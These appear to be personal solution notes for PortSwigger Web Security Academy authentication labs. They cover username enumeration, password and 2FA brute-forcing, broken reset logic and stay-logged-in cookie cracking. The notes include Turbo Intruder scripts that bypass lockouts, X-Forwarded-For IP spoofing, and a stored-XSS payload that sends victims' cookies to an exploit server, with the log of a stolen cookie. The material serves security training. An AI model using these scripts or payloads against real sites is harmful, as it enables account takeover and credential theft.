# Authentication vulnerabilities
https://portswigger.net/web-security/authentication



# 1. Lab: Username enumeration via different responses
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

1. we enter  the login page and send a test login:

```
req:
POST /login HTTP/1
...
username=a&password=a

res:
HTTP/1.1 200 OK
..
Invalid username
```

we have a tell for enumerating the username

2. send to **intruder**
```
req:
POST /login HTTP/1.1
..
username=§a§&password=a
```
(use supplied username list to enumerate the **§a§** parameter)

responses:
all resonses are HTTP/1.1 200 OK
all response but 1 have Content-Length of 3096 with **Invalid username** message
one response has Content-Length of 3098 - and a message of **Incorrect password**

we now have a Valid username: **app**

3. lets change the intruder parameters to brute-force the password:

```
req:
POST /login HTTP/1.1
..
username=app&password=§a§
```
(use supplied password list to enumerate the **§a§** parameter)

all responses but 1 are **HTTP/1.1 200 OK**
one response has a **HTTP/1.1 302 Found** - indication the we have a breach

the username: **app**
password: **superman**

sign in with the credentials
**Done**

# 2. Lab: Username enumeration via subtly different responses
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

1. we begin with enumerating the username as in previous lab
```
req:
POST /login HTTP/1.1
..
username=§Username§&password=Password
```

all responses are HTTP/1.1 200 OK
all responses dont have definite content length (by sending examples to the **Comparer** we understand its due to an ever changing parameter **analitics id:**:
```htm
  <script>fetch('/analytics?id=7953010758')</script>
```
we need to look for any other subltle changes without the help of CL.
lets Grep - Match the error messege through the option menu:
"Invalid username or password."
going through the list we can find one error message different - without a comma in the end:
"Invalid username or password" 
the different messege suggest this is a valid user name.

using intruder we iteratre through the passord list and we get 302 redirect - indication for a successful login

# Done

# 3. Lab: Username enumeration via response timing
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

sending request with wiener:peter valid credentials yeilds a 300 status 170 CL response.
we send request to intruder and use username as our prarmeter, iteraring through suppied username list. after 3 failed 3264 CL request the rest are 3340 CL with a "too many attempts were made - please wait 30 minutes to try again". - an IP based brute-force anti measure.

lets bypass it with an "X-Forwarded-For" header and using a second parameter to iterate through the IP values to spoof our IP

we hope that the system is only checking password for valid username so by using a very long password, we hope that checking it will take considerbly more time than normal - enough for us to note the delay in comaprision to other.

after spoting the delay we get the username, and find password with intruder (302 redirect)

# Done!


# Vulnerabilities in multi-factor authentication
https://portswigger.net/web-security/authentication/multi-factor


# 1. Lab: 2FA simple bypass
https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass

To solve the lab, access Carlos's account page. To solve the lab, access Carlos's account page. 

as hinted: verification process is flawed and log-in occures already after stage 1 - so all we need to do is to avoid filling the 4 digit code and directly go to / and from there to my-account to solve the lab

# DONE

# 2. Lab: 2FA broken logic
https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

to solve the lab, access Carlos's account page. 

**hint:** Carlos will not attempt to log in to the website himself.


1. login to wiener:peter account. send to repeater login process related requests.
2. try to login into carlos account - baseline failed attempt and possibly initiate mfa processes (?)
3. analyze process:
```
step 1 - POST request with username and password
step 2a - GET request to initiate mfa value and send it to client email
step 2b - POST request with mfa value recieved by email
```

4. we send the mfa initiation request (2a) with username value changed to 'carlos'
```
Cookie:	session=tvbtHdBV385CmBSB6FfVZx5XdgNSXM31; verify=carlos
  ```

5. once the mfa is initiated to carlos account - we can brute force the mfa value.(for those of you who doesnt own a Burp Pro - try initiate 10-20 intruder sessions, to finish the 10,000 iteration in a normal time)

6. when we get a 302 response we send it to the browser and get carlos my-account page

# Done


# 3. Lab: 2FA bypass using a brute-force attack
https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack

This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page. 

--will be complited soon--


# Vulnerabilities in other authentication mechanisms
https://portswigger.net/web-security/authentication/other-mechanisms



1. Lab: Brute-forcing a stay-logged-in cookie
https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

 To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page. 

 1. login with 'keep me logged-in" option checked observe cookie:
```
Cookie: session=ayjTbJZp2t7CwM04oKER8q56L95FA77V; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

2. analyze structure (using Cyber-Cheff):
64base decoding (good guess) the stay-logged value 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw' yeilds:
```
wiener:51dc30ddc473d43a6011e9ebba6ca770
```
we analize the hash in CC:
```
Hash length: 32
Byte length: 16
Bit length:  128

Based on the  length, this hash could have been generated by one of the following hashing functions:
MD5
MD4
MD2
HAVAL-128
RIPEMD-128
Snefru
Tiger-128
```
we try to hash our password (as an educated guess) via the possible hash formats and get a match at MD5 format:
```
MD5: 51dc30ddc473d43a6011e9ebba6ca770
```
now we know cookie structure:
```
base64({username}:md5({passord}))
```

3. lets craft a cookie - you can do it in two ways: 

for those who dont know how to utilize all the features of burp yet (and me among them) - you can code a 'cookie generator' - just like the "**port cookie generator.py**" I carafted (see in this folder).

 but a better option is the Burps Intruder **Payload Processing** action (located in the **Payload** tab). while using the list of passwords as payloads, we add the following steps to the payload pricess (in this exact order):
```
 Hash: MD5 
 Add Prefix: Carlos:
 Base64-encode 
```
4. we make sure that we logged out of our account and send the last **/GET /my-account HTTP/1.1** request to intruder. we mark the stay-logged-in parameter:
```
Cookie: session=WJRyvlQx4kD5OO09S2jmYbYPrNZ7Dpoa; stay-logged-in=§§
```
and using either the crafted cookies from your original code or Burps payload processing we Brute force carlos cookie.

to idntify succsses we can utilixe any of the methds below:
1. we can look for **200 ok** response 
2. in the *option tab* we can add a **Grep-Match** value **carlos**
3. in the *option tab* **Grep-Extract** we can add the location of  \<p>**Your username is: wiener**\</p> (between the \<p> tags)


# **4. Lab: Offline password cracking**
https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

 To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

Attack Flow:
```
A. find stored XSS vulnerable parameter
B. exploit XSS to steal stay-logged cookie
C. analize cookie to extract structure
D. craft a cookie to gain access to victim account and delete it
```

# A 
on **Target** tab we look for intersting endpoints:
1. **GET /my-account/delete HTTP/1.1** is our checkmate endpoint. we note it for later use.
1. at this point there is no POST requests besides the  **POST /login HTTP/1.1**.
1. **GET /post/comment HTTP/1.1** is also interesting since it implies a stored XSS possible endpoint. we go to the site and post a comment. on Burp we find the request and send it to repeater
1. we fill the request fileds as follow:
<!-- ```
postId=4&comment=xss1&name=xss2&email=xss3%40token.com&website=https://www.xss4.com
```
we send **GET /post?postId=4 HTTP/1.1** and look for **xss** reflection in the response:
```
<section class="comment">
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="https://www.**xss4**.com">**xss2**</a> | 01 October 2022
    </p>
    <p>**xss1**</p>
    <p></p>
</section>
```
lets examin each one indevidually:
``` -->
```
postId=4&comment=<script>alert()</script>&name=<script>alert()</script>&email=xss3%40token.com&website=https://www.<script>alert()</script>.com
```
in the response we see which parameter was sanitized and which did not and is vulnerable:
```
<section class="comment">
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="https://www.&lt;script&gt;alert()&lt;/script&gt;.com">&lt;script&gt;alert()&lt;/script&gt;</a> | 01 October 2022
    </p>
    <p><script>alert()</script></p>
    <p></p>
</section>
```
when we open the comment page in the browser we get, as expected, a pop-up.so we know for sure the **comment** parameter is Vulnerable. great. lets abuse it.

# B
we store another XSS - this time one that extract user cookies:
```
postId=4&comment=<script>alert(document.cookie)</script>&name=4&email=4%404.com&website=
```
in the pop-up we get 
```
stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```
just the cookie we were looking for!

now we need to exfiltrate the cookie value out. lets use a \<onerror> command with our exploit server address:
```htm
<img src=x onerror=this.src='https://exploit-0ace00bc04e3d37ac0781b29014c0061.web-security-academy.net/exploit?'+document.cookie;>
```
we check our exploit server **Access log**:
```
10.0.4.211      2022-10-01 17:26:19 +0000 "GET /exploit?secret=nQOmmQtqig7m1YdTaCfrVpU7TCVGo30F;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Safari/537.36"
```
lets copy the cookie:
```
secret=OTrpkLUsCRvNvFTLRH5hqwft2k465jNx;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```
we turn interception on and from my-account we press the link to delete account and intercept  **POST /my-account/delete HTTP/1.** request. we send it to **repeater** and drop the request. now we can log-off the account for safty (we will use the session token so better not delete ourselves by mistake).

in the repeater we change the stay-logged-in value:
```
Cookie: session=8y2B1uWKUR74XadOOpQlxHDIBivoapVY; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

we get another screen asking for password for extra cautions. basterds.
at least we can verify they recognise us as the victim:
```htm
</p>
<a href="/my-account?id=carlos">My account</a><p>
```

lets extract the password from cookie:
base64 decoding yields:
```
carlos:26323c16d5f4dabff3bb136f2460a943
```
lets check hashed password at **https://hashes.com** and it will yeild:
```
26323c16d5f4dabff3bb136f2460a943:onceuponatime
```
lets repete the deletion process this time on the website and use the newly aquired password for login to carlos and delete his account

# Great!

# 5. Lab: Password reset broken logic
https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
To solve the lab, reset Carlos's password then log in and access his "My account" page. 

lets preform a full forgot my password - password reset process and analise the different steps:
1. from **GET /login HTTP/1.1**  we  go to **GET /forgot-password HTTP/1.1** who ask us for username or email. we enter our username to it and submit.

2. in our mail server we find a link to **GET /forgot-password?temp-forgot-password-token=MoDrP6brODED2bi9rJXh0kqsfKD9lhm3 HTTP/1.** which in turn let us choose our new password via **POST /forgot-password?temp-forgot-password-token=MoDrP6brODED2bi9rJXh0kqsfKD9lhm3 HTTP/1.** 
the post request carries the parameterss:
```
temp-forgot-password-token=MoDrP6brODED2bi9rJXh0kqsfKD9lhm3&username=wiener&new-password-1=123&new-password-2=123
```
the parameter **username** looks promising - lets repeat the process, **intercept this request** and change the paramter to Carlos before releasing it to the back-end server.

3. login to Carlos acout woith our newly reseted password

# Done

# 6. Lab: Password brute-force via password change
https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page. 

1. login and preform password change via request **POST /my-account/change-password HTTP/1.1**. observe request body has parameters:
``` 
username=wiener&current-password=peter&new-password-1=12345&new-password-2=12345
```
2. send request to **Intruder** and define  **cuerrent-password** paramater as payload. change username to Carlos:
```
username=carlos&current-password=§payload§&new-password-1=12345&new-password-2=12345
```
3. load password list from lab description and preform brute force. look for **200 OK** response. we only get **302** so we need to investigate further. trying to brute force the regular password yeilds a **failed attempts limit** message, after couple of tries, rendering brute-force useless on login (and probably on password change function)
```htm
<p class=is-warning>You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>
```
4. further investigate reveles a discrepancy in wesite behaviour when the new passwords dont match:
when password is correct, but the 2 new password dont match we get:
```
New passwords do not match
```
but when the password is wrong and the 2 new password dont match we get 
```
Current password is incorrect
```

this is agreat tell - we can now make the intruder brute-force to **POST /my-account/change-password HTTP/1.1** using 2 un-matched new password and **current-password** as intruder parameter. on option tab we **Grep-Match** the **New passwords do not match** message (or both) to find quickly the request with the correct password.

5. login using carlos username and the discovered password

# Done


# Vulnerabilities in password-based login
https://portswigger.net/web-security/authentication/password-based

# 1. Lab: Username enumeration via different responses
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

**see solution above**

# 2. Lab: Username enumeration via subtly different responses
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

**see solution above**

# 3. Lab: Username enumeration via response timing
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

**see solution above**

4. Lab: Broken brute-force protection, IP block
https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block


1. login and study login process:
send baseline requests: valid and invalid combination of username and password:
observe:
```htm
valid pair - 302
invalid password -\<p class=is-warning>Incorrect password\</p>
invalid username and invalid pair -\<p class=is-warning>Invalid username\</p>
```
so the **incorrect password** message imlies **valid** username

2. with intruder craft a brute force on the username parameters, using the usernames.txt provided by the lab
```
POST /login HTTP/1.1
..

username=§wiener§&password=peter
```
observe that after 3 failed attempts IP is locaked.
lets try to bypass it:

<!-- using ip spoof:
```
X-Forwarded-For: 182.15.15.§§ 
True-Client-IP: 182.15.15.§§
X-Real-IP: 182.15.15.§§
```
didnt work... moving forward -->

lets see if login-in to our own account affect the counter:
to build an attack that every second attempt will be a valid credential to reset failed attempts timer we will use Turbo Intruder as follow:
1. if not installed - install Turbo Intruder from BApp and right click the login request and send it to Turbo Intruder
2. on turbo intruder lets tweek the example/misc.py to this code:
```python
#1. define connection parameters:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, 
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxQueueSize=3,
                           timeout=5,
                           maxRetriesPerRequest=3,
                           autoStart=False
                           )
    engine.start(timeout=5)

    # 2. reset request:
    counterreset = """POST /login HTTP/1.1
Host: 0a9800fc0374620ac05c36b500e8004c.web-security-academy.net
Content-Length: 30

username=wiener&password=peter"""

    #3. check process:   
    for word in open('/home/kali/Documents/Portswigger_labs/Broken Authentication /passwords.txt'):
        engine.queue(target.req, word.rstrip())
        engine.queue(counterreset)

# 4. filter:
def handleResponse(req, interesting):
    if '302' in req.response:
        table.add(req)
   
```
1. **connection parameters** - after much trial and error i found that using **concurrentConnections=1**,and **requestsPerConnection=1** and limiting the **maxQueueSize=3**
allows the reset logic to work proprely

2. **reset request**: this will be our "failed-attempts counter-reset request": every successful login resets de facto the counter of failed attempts. 

3. **check process** - the actual iterartion consist of a. password check request followd by b. counter reset request

4. **filter** a successful attempt yeilds 302 response so we will gather all successful responses and look in the payload column for the only raw with payload parameter full (since the rest of the 302 responses are not *payloaded* request)

we login to the account with the dicovered payload

# Done


# Lab: Username enumeration via account lock
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

1. enumerate username with Turbo intruder:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, 
                           concurrentConnections=1,
                           requestsPerConnection=10,
                           pipeline=False,
                           maxQueueSize=10,
                           timeout=5,
                           maxRetriesPerRequest=3,
                           autoStart=False
                           )
    engine.start(timeout=5)

    
    for word in open('/home/kali/Documents/Portswigger_labs/Broken Authentication /usernames.txt'):
        engine.queue(target.req, word.rstrip())
        engine.queue(target.req, word.rstrip())
        engine.queue(target.req, word.rstrip())
        engine.queue(target.req, word.rstrip())
        engine.queue(target.req, word.rstrip())
        
def handleResponse(req, interesting):
    if 'xxx' not in req.response:
        table.add(req)

```
**observe:**
on login with credential: **username=as400&password=password**, the 5th try yields response:
```htm
                       <p class=is-warning>You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>
```
now we know a valid username

2. lets brute force its password- we wil use TI again cause its fun. we prepare a new request with the valid username and the password as the parameter to brute force:
```
POST /login HTTP/1.1
Host: 0a3700400316cd69c028186e00af0049.web-security-academy.net
Cookie: session=SVGaeqsTwPhuIuCTXbUjuFO5uiAwjE4L
Content-Length: 32

username=as400&password=%s
```

lets try **examples/ratelimit.py** (its might be helpfull to avoid the 1 minute pendelty...):
```python
# Author: https://github.com/abiwaddell
# Throttle the attack per-request, and per X requests.
# Full description at https://github.com/abiwaddell/Run-Pause-Resume
import time

# Parameters to configure
triedWords=20
timeMins=0
timeSecs=5
throttleMillisecs=200

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           pipeline=False,
                           engine=Engine.BURP
                           )

    for i in range(3, 8):
        engine.queue(target.req, randstr(i), learn=1)
        engine.queue(target.req, target.baseInput, learn=2)

    secs=timeMins*60+timeSecs
    n=0
    for word in open('/home/kali/Documents/Portswigger_labs/Broken Authentication /passwords.txt'):
        time.sleep(throttleMillisecs/1000)
        engine.queue(target.req, word.rstrip())
        n+=1
        if(n==triedWords):
            time.sleep(secs)
            n=0

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
```

 run the example as is to get a baseline - surprisingly we get only 1 response in the table - and its the password! - 
 
 # brute forced!

 
 
 # 5. Lab: Broken brute-force protection, multiple credentials per request
 https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

 To solve the lab, brute-force Carlos's password, then access his account page

 1. make a login attempt to study process.
 note that the username and password are sent at json format. lets change the password "value" with an [array] of "values" from password list.

```
{"username":"carlos","password":[
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"joshua",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"
],"":""}
```
2. we send it via repeater and get **HTTP/1.1 302 Found** response pointing with **Location: /my-account** to **GET /my-account HTTP/1.1**

3. sending this to browser we find ourselves insede carlos account

# DONE